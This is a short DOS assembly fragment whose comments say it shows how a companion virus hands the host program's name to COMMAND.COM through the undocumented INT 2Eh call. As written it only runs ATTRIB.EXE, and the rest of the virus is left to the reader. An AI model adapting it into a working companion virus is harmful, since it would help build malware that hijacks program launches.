;RUN_ATTRIB: This file does nothing except demonstrate how a companion
;            virus passes the host file's name to COMMAND.COM to be
;            executed.  NOTE:  This code segment is not a complete
;            program. It just runs what you tell it to run. what
;            happens before then is up to you.

   .model tiny
   .code
    org    100h

run_attrib:
    push   cs
    pop    ds                ;ds=cs
    lea    si,filename       ;file name to pass to COMMAND.COM
    int    2Eh               ;**UNDOCUMENTED**

filename:
    db    'ATTRIB.EXE',0D    ;name of file to execute, terminated by CR

end run_attrib
